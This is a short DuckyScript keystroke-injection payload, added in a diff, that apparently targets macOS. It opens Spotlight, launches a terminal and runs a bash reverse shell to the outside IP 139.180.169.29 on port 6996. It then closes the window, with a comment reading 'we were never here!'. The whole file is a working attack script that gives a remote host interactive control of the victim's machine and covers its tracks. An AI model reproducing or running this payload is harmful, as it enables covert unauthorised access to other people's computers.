@@ -1,0 +1,32 @@
+REM spawns a reverse shell
+REM Shrey Somaiya z5257343
+REM 2 April 2020
+REM Set default delay 200ms
+
+DEFAULT_DELAY 200
+
+
+REM Command + Space ==> spotlight search
+GUI SPACE
+
+REM Search for termina
+STRING terminal
+
+ENTER
+
+STRING bash
+
+ENTER
+
+
+STRING set -m
+ENTER
+
+REM spawns a reverse shell in background
+STRING sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &" && exit
+ENTER
+
+REM we were never here!
+GUI w
+
+ENTER
